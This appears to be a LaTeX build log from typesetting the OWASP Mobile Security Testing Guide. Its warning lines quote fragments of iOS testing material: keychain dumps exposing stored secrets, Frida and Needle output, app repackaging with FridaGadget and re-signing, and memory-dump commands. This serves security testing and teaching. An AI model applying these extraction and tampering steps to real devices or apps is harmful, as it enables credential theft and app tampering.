\TU/SourceSansPro(0)/m/n/10.95 (\TU/SourceCodePro(6)/m/n/10.95 /var/containers/
Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app\TU/Sour
ceSansPro(0)/m/n/10.95 ): 

Overfull \hbox (78.02895pt too wide) in paragraph at lines 32269--32269
[]\TU/SourceCodePro(6)/m/n/10.95 ------------  -------  ------------------  ...
  --------------------------------------[] 
[556]
Overfull \hbox (14.51958pt too wide) in paragraph at lines 32269--32269
[]\TU/SourceCodePro(6)/m/n/10.95 Regular           420  None                ...
  archived-expanded-entitlements.xcent[] 

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/64430942f835261b3d5dda4b1a015f93a37444a5.
png" > [557]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/527c1334c8624ced36aea25f510ec6b9d3af0927.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/7d582611b62d36df15e2e70aa59f9b3edb63ceb5.
png" > [558]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/277e652a44a38783e21eb7c8b9f08bc1ec9ea888.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/80296790f84b6f892c5600d3679bf94df59a5303.
png" > [559]
Overfull \hbox (104.3094pt too wide) in paragraph at lines 32363--32363
[]\TU/SourceCodePro(6)/m/n/10.95 Jun  7 13:42:14 iPhone chmod[9705] <Notice>: M
S:Notice: Injecting: (null) [chmod] (1556.00)[] 

Overfull \hbox (143.7294pt too wide) in paragraph at lines 32363--32363
[]\TU/SourceCodePro(6)/m/n/10.95 Jun  7 13:42:14 iPhone readlink[9706] <Notice>
: MS:Notice: Injecting: (null) [readlink] (1556.00)[] 

Overfull \hbox (64.88942pt too wide) in paragraph at lines 32363--32363
[]\TU/SourceCodePro(6)/m/n/10.95 Jun  7 13:42:14 iPhone rm[9707] <Notice>: MS:N
otice: Injecting: (null) [rm] (1556.00)[] 

Overfull \hbox (104.3094pt too wide) in paragraph at lines 32363--32363
[]\TU/SourceCodePro(6)/m/n/10.95 Jun  7 13:42:14 iPhone touch[9708] <Notice>: M
S:Notice: Injecting: (null) [touch] (1556.00)[] 

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/962e8ecc0cf25f4714db0758530228fcd0c6d54e.
png" > [560]
Overfull \hbox (3.56946pt too wide) in paragraph at lines 32414--32414
[]\TU/SourceCodePro(6)/m/n/10.95 Note: You may be asked to authenticate using t
he devices passcode or TouchID[] 
[561]
Overfull \hbox (187.52988pt too wide) in paragraph at lines 32414--32414
[]\TU/SourceCodePro(6)/m/n/10.95 Created                    Accessible         
             ACL    Type      Account              Service                     
Data[] 

Overfull \hbox (785.39812pt too wide) in paragraph at lines 32414--32414
[]\TU/SourceCodePro(6)/m/n/10.95 -------------------------  -------------------
-----------  -----  --------  -------------------  --------------------------  
----------------------------------------------------------------------[] 

Overfull \hbox (351.77951pt too wide) in paragraph at lines 32414--32414
[]\TU/SourceCodePro(6)/m/n/10.95 2019-06-06 10:53:09 +0000  WhenUnlocked       
             None   Password  keychainValue        com.highaltitudehacks.dvia  
mypassword123[] 

Overfull \hbox (408.71944pt too wide) in paragraph at lines 32414--32414
[]\TU/SourceCodePro(6)/m/n/10.95 2019-06-06 10:53:30 +0000  WhenUnlockedThisDev
iceOnly      None   Password  SCAPILazyVector      com.toyopagroup.picaboo     
(failed to decode)[] 

Overfull \hbox (426.2394pt too wide) in paragraph at lines 32414--32414
[]\TU/SourceCodePro(6)/m/n/10.95 2019-06-06 10:53:30 +0000  AfterFirstUnlockThi
sDeviceOnly  None   Password  fideliusDeviceGraph  com.toyopagroup.picaboo     
(failed to decode)[] 

Overfull \hbox (767.87929pt too wide) in paragraph at lines 32414--32414
[]\TU/SourceCodePro(6)/m/n/10.95 2019-06-06 10:53:30 +0000  AfterFirstUnlockThi
sDeviceOnly  None   Password  SCDeviceTokenKey2    com.toyopagroup.picaboo     
00001:FKsDMgVISiavdm70v9Fhv5z+pZfBTTN7xkwSwNvVr2IhVBqLsC7QBhsEjKMxrEjh[] 

Overfull \hbox (601.4393pt too wide) in paragraph at lines 32414--32414
[]\TU/SourceCodePro(6)/m/n/10.95 2019-06-06 10:53:30 +0000  AfterFirstUnlockThi
sDeviceOnly  None   Password  SCDeviceTokenValue2  com.toyopagroup.picaboo     
CJ8Y8K2oE3rhOFUhnxJxDS1Zp8Z25XzgY2EtFyMbW3U=[] 

Overfull \hbox (520.40927pt too wide) in paragraph at lines 32481--32481
[]\TU/SourceCodePro(6)/m/n/10.95 [*] Pulling: /private/var/containers/Bundle/Ap
plication/92E7C59C-2F0B-47C5-94B7-DCF506DBEB34/iGoat-Swift.app/Info.plist -> /U
sers/razr/.needle/tmp/plist[] 

Overfull \hbox (69.26945pt too wide) in paragraph at lines 32481--32481
[]\TU/SourceCodePro(6)/m/n/10.95 [*] Setting up local port forwarding to enable
 communications with the Frida server...[] 
[562]
Overfull \hbox (18.89938pt too wide) in paragraph at lines 32481--32481
[]    \TU/SourceCodePro(6)/m/n/10.95 "Data": " (UTF8 String: []CJ8Y8K2oE3rhOFUh
nxJxDS1Zp8Z25XzgY2EtFyMbW3U=[])",[] 

Overfull \hbox (71.45938pt too wide) in paragraph at lines 32481--32481
[]\TU/SourceCodePro(6)/m/n/10.95 [*] Saving output to file: /Users/razr/.needle
/output/frida_script_dump_keychain.txt[] 

Underfull \hbox (badness 4132) in paragraph at lines 32483--32485
[]\TU/SourceSansPro(0)/m/n/10.95 Note that currently only the \TU/SourceCodePro
(6)/m/n/10.95 keychain_dump_frida \TU/SourceSansPro(0)/m/n/10.95 module works o
n iOS 12, but not the

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/0a5a8632266244b98216ae2ffb8a6a773b9dbb6d.
png" > [563] [564]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/1ddd41202821c8a781630622193411ffb54d0ff1.
png" > [565] [566]
Underfull \hbox (badness 10000) in paragraph at lines 32714--32717
[]\TU/SourceSansPro(0)/m/n/10.95 Information Property List - [][]$[][][][][] []
 [] [] [][][][][][][][][] [] [][][][][] [] [][][] [] [][][][][][][][][][][][][]
 [] [][][][][][][][][][][][][][][] []

Underfull \hbox (badness 10000) in paragraph at lines 32717--32719
[]\TU/SourceSansPro(0)/m/n/10.95 UIDeviceFamily - [][]$[][][][][] [] [] [] [][]
[][][][][][][] [] [][][][][] [] [][][] [] [][][][][][][] [] [][][][][][][] [] [
][][][][][][][][][][][][] [] [][][][][][][] []

Overfull \hbox (1.05821pt too wide) in paragraph at lines 32717--32719
[][][][][][][][][] [] [][][][][][][][][][][][][][][][][][][][][] [] [][][][][][
][][] [] [][][][][][][][][][][][] [] [][][][] [] [] [] [][][][][] [] [][][] [] 
[][][] [] [][][] [] [][][][][][][][][][] [][]

Underfull \hbox (badness 10000) in paragraph at lines 32735--32738
[]\TU/SourceSansPro(0)/m/n/10.95 class-dump - [][]$[][][][][] [] [] [] [][][][]
[][] [] [][][] [] [][][][][][][][][][][][] [][] [][][][][][][][] [] [][][] [][]
 [][][][][][][] [][] [][][][][] [] [][][][] [] [][][][][][] [] [][][][][] [][]

Underfull \hbox (badness 10000) in paragraph at lines 32738--32741
[]\TU/SourceSansPro(0)/m/n/10.95 class-dump-z - [][]$[][][][][] [] [] [] [][][]
[][][] [] [][][] [] [][][][][][][][][][][][] [][] [][][][][][][][] [] [][][] []
[] [][][][][][][] [][] [][][][][] [] [][][][] [] [][][][][][] [] [][][][][] [][
]
[567] [568] [569] [570]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/7670982e5e0675cd414876d6c2505da3b7519c33.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/6ae07a22cc86ccf206cc62961a54d037a436add3.
png" > [571] [572]
Overfull \hbox (253.22957pt too wide) in paragraph at lines 33044--33044
[]  \TU/SourceCodePro(6)/m/n/10.95 MH_MAGIC     ARM         V7  0x00     EXECUT
E    38       4292   NOUNDEFS DYLDLINK TWOLEVEL WEAK_DEFINES BINDS_TO_WEAK PIE[
] 

Overfull \hbox (270.74953pt too wide) in paragraph at lines 33044--33044
[]\TU/SourceCodePro(6)/m/n/10.95 MH_MAGIC_64   ARM64        ALL  0x00     EXECU
TE    38       4856   NOUNDEFS DYLDLINK TWOLEVEL WEAK_DEFINES BINDS_TO_WEAK PIE
[] 

Overfull \hbox (7.94943pt too wide) in paragraph at lines 33054--33054
[]\TU/SourceCodePro(6)/m/n/10.95 iOS8-jailbreak:~ root# lipo -thin armv7 DamnVu
lnerableIOSApp -output DVIA32[] 

Overfull \hbox (286.0793pt too wide) in paragraph at lines 33066--33066
[]\TU/SourceCodePro(6)/m/n/10.95 @interface FlurryUtil : ./DVIA/DVIA/DamnVulner
ableIOSApp/DamnVulnerableIOSApp/YapDatabase/Extensions/Views/Internal/[] 
[573]
Underfull \hbox (badness 2591) in paragraph at lines 33125--33133
[]\TU/SourceSansPro(0)/m/n/10.95 In addition to the techniques learned in the “
[][]Disassembling and Decompiling[][]” section, for this

Underfull \hbox (badness 1389) in paragraph at lines 33125--33133
\TU/SourceSansPro(0)/m/n/10.95 section you’ll need some understanding of the []
[]Objective-C runtime[][]. For instance, functions like

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/58dbf28ff380c5c9e7a07711dd5b2f67ac2448ce.
png" > [574]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/6e69c2562dd8593aead2a562db4a760b9647d1f9.
png" > [575] [576]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/12bde274c195d950e097030a4d940aa69ef599dc.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/d3aa388017c64db3d09718bc6afdc1b49657d0a1.
png" > [577] [578]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/4fa0bcc01f6c81e1c689a905d989b9ce170cd436.
png" > [579] [580]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/3aa39770f872dc479a47edc037663d4dd7117ffe.
png" > [581] [582]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/07ef2bb02fa4cf9a0fd9f84179a1244d413cb209.
png" > [583] [584]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/65bd1b73aeaa3a7034682bc1d4b2c3b203ad8d79.
png" > [585] [586] [587]
Overfull \hbox (167.8194pt too wide) in paragraph at lines 33506--33506
[] \TU/SourceCodePro(6)/m/n/10.95 1) 61FA3547E0AF42A11E233F6A2B255E6B6AF262CE "
iPhone Distribution: Vantage Point Security Pte. Ltd."[] 

Overfull \hbox (126.20938pt too wide) in paragraph at lines 33506--33506
[] \TU/SourceCodePro(6)/m/n/10.95 2) 8004380F331DCA22CC1B47FB1A805890AE41C938 "
iPhone Developer: Bernhard Müller (RV852WND79)"[] 
[588]
Overfull \hbox (262.93832pt too wide) in paragraph at lines 33525--33535
\TU/SourceSansPro(0)/m/n/10.95 home directory: \TU/SourceCodePro(6)/m/n/10.95 ~
/Library/Developer/Xcode/DerivedData/<ProjectName>/Build/Products/Debug-iphoneo
s/<ProjectName>.app/\TU/SourceSansPro(0)/m/n/10.95 .

Overfull \hbox (91.16939pt too wide) in paragraph at lines 33563--33563
[]\TU/SourceCodePro(6)/m/n/10.95 $ /usr/libexec/PlistBuddy -x -c []Print :Entit
lements[] profile.plist > entitlements.plist[] 

Overfull \hbox (187.52934pt too wide) in paragraph at lines 33563--33563
[]\TU/SourceCodePro(6)/m/n/10.95 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.
0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">[] 
[589]
Overfull \hbox (73.64941pt too wide) in paragraph at lines 33600--33600
[]\TU/SourceCodePro(6)/m/n/10.95 $ ln -s <your-path-to-ios-deploy>/build/Releas
e/ios-deploy /usr/local/bin/ios-deploy[] 
[590]
Overfull \hbox (505.07933pt too wide) in paragraph at lines 33662--33662
[]\TU/SourceCodePro(6)/m/n/10.95 iOweApp 2828 mobile  txt    REG    1,3   20614
4 189774 /private/var/containers/Bundle/Application/F390A491-3524-40EA-B3F8-6C1
FA105A23A/iOweApp.app/iOweApp[] 

Overfull \hbox (1059.14919pt too wide) in paragraph at lines 33662--33662
[]\TU/SourceCodePro(6)/m/n/10.95 iOweApp 2828 mobile  txt    REG    1,3     549
2 213230 /private/var/mobile/Containers/Data/Application/5AB3E437-9E2D-4F04-BD2
B-972F6055699E/tmp/com.apple.dyld/iOweApp-6346DC276FE6865055F1194368EC73CC72E4C
5224537F7F23DF19314CF6FD8AA.closure[] 

Overfull \hbox (207.23941pt too wide) in paragraph at lines 33662--33662
[]\TU/SourceCodePro(6)/m/n/10.95 iOweApp 2828 mobile  txt    REG    1,3    3062
8 212198 /private/var/preferences/Logging/.plist-cache.vqXhr1EE[] 

Overfull \hbox (75.83948pt too wide) in paragraph at lines 33662--33662
[]\TU/SourceCodePro(6)/m/n/10.95 iOweApp 2828 mobile  txt    REG    1,2    5008
0 234433 /usr/lib/libobjc-trampolines.dylib[] 

Overfull \hbox (161.24944pt too wide) in paragraph at lines 33662--33662
[]\TU/SourceCodePro(6)/m/n/10.95 iOweApp 2828 mobile  txt    REG    1,2   34420
4  74185 /System/Library/Fonts/AppFonts/ChalkboardSE.ttc[] 

Overfull \hbox (215.99947pt too wide) in paragraph at lines 33683--33683
[]\TU/SourceCodePro(6)/m/n/10.95 launchd   1 root   31u  IPv4 0x69c2ce211253b90
b      0t0  TCP 192.168.1.12:ssh->192.168.1.8:62684 (ESTABLISHED)[] 

Overfull \hbox (215.99947pt too wide) in paragraph at lines 33683--33683
[]\TU/SourceCodePro(6)/m/n/10.95 launchd   1 root   42u  IPv4 0x69c2ce211253b90
b      0t0  TCP 192.168.1.12:ssh->192.168.1.8:62684 (ESTABLISHED)[] 
[591]
Underfull \hbox (badness 1762) in paragraph at lines 33711--33722
\TU/SourceSansPro(0)/m/n/10.95 use it for attaching, stepping or continuing the
 process but they cannot use it to read or write

Underfull \hbox (badness 1997) in paragraph at lines 33711--33722
\TU/SourceSansPro(0)/m/n/10.95 Mach IPC interface API functions to perform acti
ons such as suspending the target process and

Underfull \hbox (badness 1881) in paragraph at lines 33711--33722
\TU/SourceSansPro(0)/m/n/10.95 reading/writing register states (\TU/SourceCodeP
ro(6)/m/n/10.95 thread_get_state\TU/SourceSansPro(0)/m/n/10.95 /\TU/SourceCodeP
ro(6)/m/n/10.95 thread_set_state\TU/SourceSansPro(0)/m/n/10.95 ) and virtual me
mory

Overfull \hbox (371.48932pt too wide) in paragraph at lines 33749--33749
[]\TU/SourceCodePro(6)/m/n/10.95 /Applications/Xcode.app/Contents/Developer/Pla
tforms/iPhoneOS.platform/DeviceSupport/<target-iOS-version>/DeveloperDiskImage.
dmg[] 
[592] [593] [594] [595]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/ebc00f60d8d1aad4169130902c075b6da5552d9c.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/2232357dcab82a2afd5c51a6eeb185b4f7f281e9.
png" > [596]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/a3b0e5e3a2b9e0460b87f2fd5e167803aa68278f.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/aafba1daf9b3c7d33c63306630e1ad7c2adea156.
png" > [597] [598]
Overfull \hbox (229.13936pt too wide) in paragraph at lines 34059--34059
[]\TU/SourceCodePro(6)/m/n/10.95 -[NSURL isMusicStoreURL]: Loaded handler at "/
Users/berndt/Desktop/__handlers__/__NSURL_isMusicStoreURL_.js"[] 

Overfull \hbox (202.85934pt too wide) in paragraph at lines 34059--34059
[]\TU/SourceCodePro(6)/m/n/10.95 -[NSURL isAppStoreURL]: Loaded handler at "/Us
ers/berndt/Desktop/__handlers__/__NSURL_isAppStoreURL_.js"[] 

Overfull \hbox (150.29941pt too wide) in paragraph at lines 34073--34073
[] \TU/SourceCodePro(6)/m/n/10.95 21324 ms     | -[NSURLRequest initWithURL:0x1
06388b00 cachePolicy:0x0 timeoutInterval:0x106388b80[] 
[599]
Underfull \hbox (badness 5374) in paragraph at lines 34144--34150
\TU/SourceSansPro(0)/m/n/10.95 a point where performing further manual analysis
 was cumbersome. The function at offset
[600]
Underfull \hbox (badness 2103) in paragraph at lines 34171--34174
[]\TU/SourceSansPro(0)/m/n/10.95 Pass the above \TU/SourceCodePro(6)/m/n/10.95 
callable \TU/SourceSansPro(0)/m/n/10.95 object to the concrete execution engine
, which in this case is
[601]
Overfull \hbox (316.73938pt too wide) in paragraph at lines 34251--34251
[]\TU/SourceCodePro(6)/m/n/10.95 $ optool install -c load -p "@executable_path/
FridaGadget.dylib"  -t Payload/UnCrackable\ Level\ 1.app/UnCrackable\ Level\ 1[
] 

Overfull \hbox (14.51944pt too wide) in paragraph at lines 34251--34251
[]\TU/SourceCodePro(6)/m/n/10.95 Writing executable to Payload/UnCrackable Leve
l 1.app/UnCrackable Level 1...[] 

Overfull \hbox (163.43936pt too wide) in paragraph at lines 34267--34267
[]\TU/SourceCodePro(6)/m/n/10.95 $ cp AwesomeRepackaging.mobileprovision Payloa
d/UnCrackable\ Level\ 1.app/embedded.mobileprovision[] 

Overfull \hbox (334.25934pt too wide) in paragraph at lines 34276--34276
[]\TU/SourceCodePro(6)/m/n/10.95 $ /usr/libexec/PlistBuddy -c "Set :CFBundleIde
ntifier sg.vantagepoint.repackage" Payload/UnCrackable\ Level\ 1.app/Info.plist
[] 
[602]
Overfull \hbox (353.9693pt too wide) in paragraph at lines 34287--34287
[]\TU/SourceCodePro(6)/m/n/10.95 $ /usr/bin/codesign --force --sign 8004380F331
DCA22CC1B47FB1A805890AE41C938  Payload/UnCrackable\ Level\ 1.app/FridaGadget.dy
lib[] 

Overfull \hbox (38.6094pt too wide) in paragraph at lines 34287--34287
[]\TU/SourceCodePro(6)/m/n/10.95 Payload/UnCrackable Level 1.app/FridaGadget.dy
lib: replacing existing signature[] 

Overfull \hbox (590.48926pt too wide) in paragraph at lines 34295--34295
[]\TU/SourceCodePro(6)/m/n/10.95 $ /usr/bin/codesign --force --sign 8004380F331
DCA22CC1B47FB1A805890AE41C938 --entitlements entitlements.plist Payload/UnCrack
able\ Level\ 1.app/UnCrackable\ Level\ 1[] 

Overfull \hbox (47.36943pt too wide) in paragraph at lines 34295--34295
[]\TU/SourceCodePro(6)/m/n/10.95 Payload/UnCrackable Level 1.app/UnCrackable Le
vel 1: replacing existing signature[] 

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/94b4595a116ad9f96b949066605079edc2104eb6.
png" > [603]
Overfull \hbox (231.49368pt too wide) in paragraph at lines 34344--34349
[]\TU/SourceSansPro(0)/m/n/10.95 At installation time, the application archive 
is unpacked into the folder \TU/SourceCodePro(6)/m/n/10.95 /private/var/contain
ers/Bundle/Application/[GUID]/[APP].app

Overfull \hbox (46.50075pt too wide) in paragraph at lines 34387--34390
[]\TU/SourceSansPro(0)/m/n/10.95 Put the \TU/SourceSansPro(0)/m/it/10.95 patche
d code \TU/SourceSansPro(0)/m/n/10.95 on a single line and copy it into the ori
ginal \TU/SourceCodePro(6)/m/n/10.95 Payload/[APP].app/main.jsbundle
[604]
Overfull \hbox (40.79941pt too wide) in paragraph at lines 34468--34468
[]\TU/SourceCodePro(6)/m/n/10.95 $ wget https://cydia.saurik.com/api/latest/3 -
O cycript.zip && unzip cycript.zip[] 
[605]
Overfull \hbox (80.21939pt too wide) in paragraph at lines 34489--34489
[]\TU/SourceCodePro(6)/m/n/10.95 501 78 1 0 0:00.00 ?? 0:10.57 /System/Library/
CoreServices/SpringBoard.app/SpringBoard[] 

Overfull \hbox (583.91928pt too wide) in paragraph at lines 34512--34512
[]\TU/SourceCodePro(6)/m/n/10.95 cy# alertView = [[UIAlertView alloc] initWithT
itle:@"OWASP MSTG" message:@"Mobile Security Testing Guide"  delegate:nil cance
lButtonitle:@"OK" otherButtonTitles:nil][] 

Overfull \hbox (25.46942pt too wide) in paragraph at lines 34512--34512
[]\TU/SourceCodePro(6)/m/n/10.95 #"<UIAlertView: 0x1645c550; frame = (0 0; 0 0)
; layer = <CALayer: 0x164df160>>"[] 

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/f891e21426c16da3312771ade698d40bf018f411.
png" > [606]
Overfull \hbox (198.47935pt too wide) in paragraph at lines 34525--34525
[]\TU/SourceCodePro(6)/m/n/10.95 cy# [[NSFileManager defaultManager] URLsForDir
ectory:NSDocumentDirectory inDomains:NSUserDomainMask][0][] 

Overfull \hbox (161.24933pt too wide) in paragraph at lines 34525--34525
[]\TU/SourceCodePro(6)/m/n/10.95 #"file:///var/mobile/Containers/Data/Applicati
on/A8AE15EE-DC8B-4F1C-91A5-1FED35212DF/Documents/"[] 
[607] [608]
Overfull \hbox (12.32939pt too wide) in paragraph at lines 34596--34596
[]    \TU/SourceCodePro(6)/m/n/10.95 "/System/Library/Frameworks/CoreFoundation
.framework/CoreFoundation": [[] 

Overfull \hbox (229.13933pt too wide) in paragraph at lines 34596--34596
[]    \TU/SourceCodePro(6)/m/n/10.95 "/private/var/containers/Bundle/Applicatio
n/F390A491-3524-40EA-B3F8-6C1FA105A23A/iOweApp.app/iOweApp": [[] 
[609]
Overfull \hbox (286.07935pt too wide) in paragraph at lines 34652--34652
[]        \TU/SourceCodePro(6)/m/n/10.95 "path": "/private/var/containers/Bundl
e/Application/F390A491-3524-40EA-B3F8-6C1FA105A23A/iOweApp.app/iOweApp",[] 

Overfull \hbox (16.70943pt too wide) in paragraph at lines 34652--34652
[]        \TU/SourceCodePro(6)/m/n/10.95 "path": "/System/Library/Frameworks/Fo
undation.framework/Foundation",[] 
[610] [611]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/6a60765ca34ee9e713a1c08bd8506a2ef18541bf.
png" > [612] [613] [614]
Underfull \hbox (badness 1400) in paragraph at lines 34866--34870
\TU/SourceSansPro(0)/m/n/10.95 main app binary iGoat-Swift is located at \TU/So
urceCodePro(6)/m/n/10.95 0x0000000100b7c000 \TU/SourceSansPro(0)/m/n/10.95 and 
the Realm Framework at

Overfull \hbox (483.17842pt too wide) in paragraph at lines 34885--34885
[]\TU/SourceCodePro(6)/m/n/10.95 --------------------------------  ----------- 
 --------------------  --------------------------------------------------------
----------------------[] 

Overfull \hbox (426.23946pt too wide) in paragraph at lines 34885--34885
[]\TU/SourceCodePro(6)/m/n/10.95 iGoat-Swift                       0x100b7c000 
 2506752 (2.4 MiB)     /var/containers/Bundle/Application/3ADAF47D-A734-49FA-B2
74-FBCA66589E67/iGo...[] 

Overfull \hbox (95.54951pt too wide) in paragraph at lines 34885--34885
[]\TU/SourceCodePro(6)/m/n/10.95 TweakInject.dylib                 0x100eb4000 
 16384 (16.0 KiB)      /usr/lib/TweakInject.dylib[] 

Overfull \hbox (445.94937pt too wide) in paragraph at lines 34885--34885
[]\TU/SourceCodePro(6)/m/n/10.95 SystemConfiguration               0x1862c0000 
 446464 (436.0 KiB)    /System/Library/Frameworks/SystemConfiguration.framework
/SystemConfiguratio...[] 

Overfull \hbox (73.64952pt too wide) in paragraph at lines 34885--34885
[]\TU/SourceCodePro(6)/m/n/10.95 libc++.1.dylib                    0x1847c0000 
 368640 (360.0 KiB)    /usr/lib/libc++.1.dylib[] 

Overfull \hbox (34.01901pt too wide) in paragraph at lines 34909--34913
[]\TU/SourceSansPro(0)/m/n/10.95 You can adjust your search by using the search
 settings \TU/SourceCodePro(6)/m/n/10.95 \e~search\TU/SourceSansPro(0)/m/n/10.9
5 . For example, \TU/SourceCodePro(6)/m/n/10.95 \e search.quiet=true;
[615] [616]
Overfull \hbox (29.84941pt too wide) in paragraph at lines 35048--35048
[]\TU/SourceCodePro(6)/m/n/10.95 iPhone on (iPhone: 10.3.1) [usb] # memory dump
 all /Users/foo/memory_iOS/memory[] 

Overfull \hbox (75.83943pt too wide) in paragraph at lines 35048--35048
[]\TU/SourceCodePro(6)/m/n/10.95 Dumping 768.0 KiB from base: 0x1ad200000  [###
#################################]  100%[] 
[617]
Overfull \hbox (36.41937pt too wide) in paragraph at lines 35075--35075
[]\TU/SourceCodePro(6)/m/n/10.95 Progress: [###################################
###############] 100.0% Complete[] 

Overfull \hbox (36.41937pt too wide) in paragraph at lines 35075--35075
[]\TU/SourceCodePro(6)/m/n/10.95 Progress: [###################################
###############] 100.0% Complete[] 
[618] [619] [620]
Overfull \hbox (12.32951pt too wide) in paragraph at lines 35249--35249
[]\TU/SourceCodePro(6)/m/n/10.95 │       │   0x18eec5ca2      02aa9b494197   ad
d ch, byte [rdx - 0x68beb665] ; arg3[] 
[621]
Underfull \hbox (badness 2343) in paragraph at lines 35306--35309
[]\TU/SourceSansPro(0)/m/n/10.95 iOS Instrumentation without Jailbreak - [][]$[
][][][][] [] [] [] [][][] [] [][][][][][][][] [] [][][][][] [] [][] [] [][][][]
[] [][] [][] [] [][][][][][][][] [][]
[622]
Underfull \hbox (badness 10000) in paragraph at lines 35363--35366
[]\TU/SourceSansPro(0)/m/n/10.95 OWASP UnCrackable Apps for iOS - [][]$[][][][]
[] [] [] [] [][][][][][] [] [][][] [] [][][][][] [] [][][][][] [][] [][][][] []
 [][][][] [] [][][][][][] []

Underfull \hbox (badness 10000) in paragraph at lines 35370--35373
[]\TU/SourceSansPro(0)/m/n/10.95 Reverse Engineering tools for iOS Apps - [][]$
[][][][] [] [] [] [][][][][][][][][][][][][] [] [][][] [] [][][][][] [] [][][] 
[] [][][][][][][] []

Underfull \hbox (badness 10000) in paragraph at lines 35375--35377
[]\TU/SourceSansPro(0)/m/n/10.95 Xcode command line developer tools - [][]$[][]
[][][] [] [] [] [][][][][][][][][] [] [][][][][][] [] [][] [] [][][][][] [][] [
][][][][][][] [][] [][][][] [][]
[623]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/153fa4a61498a02f5937730470fadbf4339e20ac.
jpg" > [624] [625]
Underfull \hbox (badness 10000) in paragraph at lines 35554--35556
[]\TU/SourceCodePro(6)/m/n/10.95 AccessControlFlags \TU/SourceSansPro(0)/m/n/10
.95 define the mechanisms with which users can authenticate the key

Overfull \hbox (164.11397pt too wide) in paragraph at lines 35576--35581
[]\TU/SourceSansPro(0)/m/n/10.95 Please note that keys secured by Touch ID (via
 \TU/SourceCodePro(6)/m/n/10.95 kSecAccessControlBiometryAny \TU/SourceSansPro(
0)/m/n/10.95 or \TU/SourceCodePro(6)/m/n/10.95 kSecAccessControlBiometryCurrent
Set\TU/SourceSansPro(0)/m/n/10.95 )
[626]
Overfull \hbox (40.7994pt too wide) in paragraph at lines 35604--35604
[]    \TU/SourceCodePro(6)/m/n/10.95 return LAContext().canEvaluatePolicy(.devi
ceOwnerAuthentication, error: nil)[] 

Overfull \hbox (42.98941pt too wide) in paragraph at lines 35616--35616
[]  \TU/SourceCodePro(6)/m/n/10.95 if ([context canEvaluatePolicy:LAPolicyDevic
eOwnerAuthentication error:nil]) {[] 
[627] [628]
Underfull \hbox (badness 3536) in paragraph at lines 35726--35729
\TU/SourceCodePro(6)/m/n/10.95 kSecAttrTokenIDSecureEnclave\TU/SourceSansPro(0)
/m/n/10.95 : this indicates that we want to use the Secure Enclave
[629] [630] [631]
Overfull \hbox (176.57944pt too wide) in paragraph at lines 35906--35906
[]\TU/SourceCodePro(6)/m/n/10.95 // Open the encrypted Realm file where getKey(
) is a method to obtain a key from the Keychain or a server[] 

Overfull \hbox (40.79945pt too wide) in paragraph at lines 35906--35906
[]  \TU/SourceCodePro(6)/m/n/10.95 // If the encryption key is wrong, []error[]
 will say that it[]s an invalid database[] 
[632]
Overfull \hbox (12.2613pt too wide) in paragraph at lines 35966--35969
[]\TU/SourceSansPro(0)/m/n/10.95 Navigate to the output directory and locate \T
U/SourceCodePro(6)/m/n/10.95 $APP_NAME.imazing\TU/SourceSansPro(0)/m/n/10.95 . 
Rename it to \TU/SourceCodePro(6)/m/n/10.95 $APP_NAME.zip\TU/SourceSansPro(0)/m
/n/10.95 . 
[633]
Underfull \hbox (badness 1762) in paragraph at lines 36016--36021
\TU/SourceSansPro(0)/m/n/10.95 an iOS device. With access to the source code an
d Xcode the app can be build and deployed

Underfull \hbox (badness 1769) in paragraph at lines 36016--36021
\TU/SourceSansPro(0)/m/n/10.95 in the iOS simulator. The file system of the cur
rent device of the iOS simulator is available in
[634] [635] [636]
Overfull \hbox (195.2431pt too wide) in paragraph at lines 36260--36264
\TU/SourceSansPro(0)/m/n/10.95 tion and spell checking. Most keyboard input is 
cached by default, in \TU/SourceCodePro(6)/m/n/10.95 /private/var/mobile/Librar
y/Keyboard/dynamic-text.dat\TU/SourceSansPro(0)/m/n/10.95 . 
[637]
Underfull \hbox (badness 5119) in paragraph at lines 36274--36282
[]\TU/SourceCodePro(6)/m/n/10.95 var autocorrectionType: UITextAutocorrectionTy
pe \TU/SourceSansPro(0)/m/n/10.95 determines whether

Underfull \hbox (badness 2245) in paragraph at lines 36274--36282
\TU/SourceSansPro(0)/m/n/10.95 autocorrection is enabled during typing. When au
tocorrection is enabled, the text object

Underfull \hbox (badness 2547) in paragraph at lines 36274--36282
\TU/SourceSansPro(0)/m/n/10.95 tracks unknown words and suggests suitable repla
cements, replacing the typed text auto-

Underfull \hbox (badness 1515) in paragraph at lines 36274--36282
\TU/SourceSansPro(0)/m/n/10.95 matically unless the user overrides the replacem
ent. The default value of this property is

Overfull \hbox (15.45145pt too wide) in paragraph at lines 36311--36318
\TU/SourceSansPro(0)/m/n/10.95 Bars. For data that should be masked, such as PI
Ns and passwords, set \TU/SourceCodePro(6)/m/n/10.95 textObject.secureTextEntry

[638]
Overfull \hbox (71.45938pt too wide) in paragraph at lines 36378--36378
[]\TU/SourceCodePro(6)/m/n/10.95 [*] Saving output to file: /home/phanvanloc/.n
